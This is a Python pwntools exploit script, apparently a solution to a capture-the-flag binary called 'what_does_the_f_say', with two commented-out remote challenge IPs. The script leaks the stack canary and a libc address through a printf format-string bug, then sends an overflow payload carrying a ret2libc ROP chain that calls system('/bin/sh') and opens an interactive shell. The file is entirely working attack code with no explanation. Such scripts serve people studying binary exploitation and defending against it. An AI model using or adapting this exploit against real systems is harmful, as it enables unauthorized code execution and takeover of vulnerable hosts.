#!/usr/bin/python3

import re
from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split
from time import sleep

elf 				= context.binary = ELF('./what_does_the_f_say', checksec = False)
# libc 				= ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec = False)
# libc = elf.libc
# ld				    = ELF('/lib64/ld-linux-x86-64.so.2', checksec = False)

context.terminal = ['tmux', 'splitw', '-h', '-p', '60', '-I']
context.log_level = "INFO"
gdb_debug = False

gs = '''
brva 0x00001499
brva 0x0000164c
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug(elf.path, gdbscript=gs)
	else:
		return process([elf.path] + argv, *a, **kw)
		
def find_ip_offset():
	io = start_local(gdb_debug)
	canary = leak_canary()

	payload = flat(
			b"a" * 24,
			p64(canary),
			cyclic(303)	
		)

	overflow(io, payload)
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [{}]".format(ip_offset))
	return ip_offset
	
def generate_payload_aligned(raw_payload, junk, ret):
    payload1 = junk + raw_payload
    if (len(payload1) % 16) == 0:
        return payload1
    
    else:
        payload2 = junk + p64(ret) + raw_payload
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1

#===========================================================
#					EXPLOIT GOES HERE					   #
#===========================================================
# offset = find_ip_offset()
offset = 8

######## REMOTE ########
#io = remote("159.65.51.138", 30768)

######## LOCAL ########
# Leak canary using printf vulnerability in drinks_menu()
def leak_canary(io) -> int:
	io.recvuntil(b"food\n")
	io.sendline(b"1")
	io.recvuntil(b"Deathstar(70.00 s.rocks)\n")
	io.sendline(b"2")
	io.recvuntil(b"Kryptonite?\n")
	io.sendline(b"%23$p")
	output = io.recvline().strip()
	print(f"Canary output: {output.decode('utf-8')}")
	canary_string = output.decode('utf-8')
	canary_int = int(canary_string, 16)
	print(f"Canary: {canary_string}")
	return canary_int

def leak_libc(io, canary) -> int:
	io.sendline(b"1")
	io.recvuntil(b"Deathstar(70.00 s.rocks)\n")
	io.sendline(b"2")
	io.recvuntil(b"Kryptonite?\n")
	io.sendline(b"%25$p")
	output = io.recvline().strip()
	print(f"libc output: {output}")

	leaked_libc_string = output.strip()
	leaked_libc_int = int(leaked_libc_string, 16)
	print(f"Libc leak: {leaked_libc_string}")
	libc_base = leaked_libc_int - 0x2718a
	print(f"{hex(libc_base)=}")
	return libc_base 

def overflow(io, payload):
	# Reach less than 20 srocks to get to warning function
	for _ in range(9):
		io.recvuntil(b'food\n')
		io.sendline(b'1')
		io.recvuntil(b'rocks)\n')
		io.sendline(b'1')
	 
	io.recvuntil(b'food\n')
	io.sendline(b'1')
	io.recvuntil(b'rocks)\n')
	io.sendline(b'2')
	io.recvuntil(b'Kryptonite?\n')
	io.sendline(b'red')
	io.recvuntil(b'buy it?\n')

	io.sendline(payload)
	io.interactive()


io = start_local(gdb_debug)
# io = remote("157.245.39.76", 31382)

canary = leak_canary(io)
libc_base = leak_libc(io, canary)

pop_rdi_ret = libc_base + 0x00000000000fdf2e
ret = libc_base + 0x00000000000f27b2
system = libc_base + 0x000000000004c330
binsh = libc_base + 0x196031
print(f"{hex(ret)=}")
print(f"{hex(pop_rdi_ret)=}")
print(f"{hex(system)=}")
print(f"{hex(binsh)=}")

payload = flat(
	b"a" * 24,
	canary,
	b"f" * 8,
	ret,
	pop_rdi_ret,
	binsh,
	system,
)

overflow(io, payload)